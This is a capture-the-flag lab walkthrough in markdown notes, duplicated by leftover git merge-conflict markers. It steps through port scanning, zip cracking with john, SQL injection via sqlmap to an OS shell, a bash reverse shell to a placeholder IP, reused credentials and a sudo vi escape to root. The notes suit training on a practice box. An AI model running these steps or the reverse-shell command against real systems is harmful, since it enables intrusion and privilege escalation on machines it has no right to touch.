<<<<<<< HEAD
- 10.10.10.46
 
- nmap scan for open ports:
	- 21: ftp
		- vsftpd 3.0.3
	- 22: ssh
		- openSSH 8.0p1
	- 80: http
		- Apache httpd 2.4.41

- ftp:
	- connect with given creds:
		- `ftpuser:mc@F1l3ZilL4`
	- → received .zip file protected with password
		- crack with john:
		```
		zip2john <.zip_file> > <output.hashes>
		john <output.hashes> -w <wordlist>
		```
		- get password `backup.zip:741852963`
		- and files `style.css, index.php`
			- in index.php there is password hash (MD5) → `2cb42f8734ea607eefed3b70af13bbd3:qwerty789`

- webpage
	- login page - try creds from previous box
		- → no go
	- login page - try creds from `index.php`
		- `admin:qwerty789`
	- →we get to page with search
		- vulnerable to SQL injection
		- run sqlmap on it:	`sqlmap -u='<URL>' --cookie="<COOKIE_inc_the_name>"`
		- get shell - run previous command with `--os-shell`


- foothold
	- gotten with sqlmap
	- run `bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'` for reverse shell

- privilege escalation
	- do research in `/var/www/`
	- in `dashboard.php` are creds
		- `postgres:P@s5w0rd!`
	- `sudo -l`
		- you can run `/bin/vi /etc/postgresql/11/main/pg_hba.conf` as sudo
=======
- 10.10.10.46
 
- nmap scan for open ports:
	- 21: ftp
		- vsftpd 3.0.3
	- 22: ssh
		- openSSH 8.0p1
	- 80: http
		- Apache httpd 2.4.41

- ftp:
	- connect with given creds:
		- `ftpuser:mc@F1l3ZilL4`
	- → received .zip file protected with password
		- crack with john:
		```
		zip2john <.zip_file> > <output.hashes>
		john <output.hashes> -w <wordlist>
		```
		- get password `backup.zip:741852963`
		- and files `style.css, index.php`
			- in index.php there is password hash (MD5) → `2cb42f8734ea607eefed3b70af13bbd3:qwerty789`

- webpage
	- login page - try creds from previous box
		- → no go
	- login page - try creds from `index.php`
		- `admin:qwerty789`
	- →we get to page with search
		- vulnerable to SQL injection
		- run sqlmap on it:	`sqlmap -u='<URL>' --cookie="<COOKIE_inc_the_name>"`
		- get shell - run previous command with `--os-shell`


- foothold
	- gotten with sqlmap
	- run `bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'` for reverse shell

- privilege escalation
	- do research in `/var/www/`
	- in `dashboard.php` are creds
		- `postgres:P@s5w0rd!`
	- `sudo -l`
		- you can run `/bin/vi /etc/postgresql/11/main/pg_hba.conf` as sudo
>>>>>>> ed86870e047cc27b656f2f20735dd248c5953b5d
			- from vi run `:!/bin/bash` → root → flag